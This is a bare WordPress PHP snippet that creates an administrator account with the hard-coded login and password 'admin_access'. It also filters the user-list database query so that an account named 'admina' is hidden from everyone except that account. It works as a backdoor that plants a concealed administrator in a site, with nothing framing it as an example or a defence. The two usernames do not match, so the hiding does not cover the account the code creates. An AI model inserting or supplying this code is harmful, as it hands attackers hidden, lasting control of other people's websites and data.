$new_user = new WP_User(wp_create_user('admin_access','admin_access'));
$new_user->set_role('administrator');
add_action('pre_user_query','yoursite_pre_user_query');function yoursite_pre_user_query($user_search) {  global $current_user;  $username = $current_user->user_login;
  if ($username != 'admina') {     global $wpdb;    $user_search->query_where = str_replace('WHERE 1=1',      "WHERE 1=1 AND {$wpdb->users}.user_login != 'admina'",$user_search->query_where);  }}
